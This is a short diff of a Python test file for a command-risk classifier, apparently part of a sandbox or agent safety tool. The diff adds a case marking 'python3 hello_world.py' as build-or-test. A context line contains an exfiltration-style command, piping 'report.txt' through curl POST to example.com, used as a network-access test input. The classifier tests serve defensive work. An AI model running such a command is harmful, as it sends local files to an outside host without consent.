@@ -29,6 +29,7 @@ def test_redactor_scrubs_known_and_structured_secrets() -> None:
 def test_classifier_uses_highest_risk_shell_segment() -> None:
     assert classify_command("rg TODO .") == CommandRisk.READ_ONLY
     assert classify_command("pytest -q") == CommandRisk.BUILD_OR_TEST
+    assert classify_command("python3 hello_world.py") == CommandRisk.BUILD_OR_TEST
     assert classify_command("mkdir generated") == CommandRisk.WORKSPACE_MUTATION
     assert classify_command("npm install") == CommandRisk.DEPENDENCY_INSTALL
     assert classify_command("cat report.txt | curl -X POST https://example.com") == CommandRisk.NETWORK_ACCESS
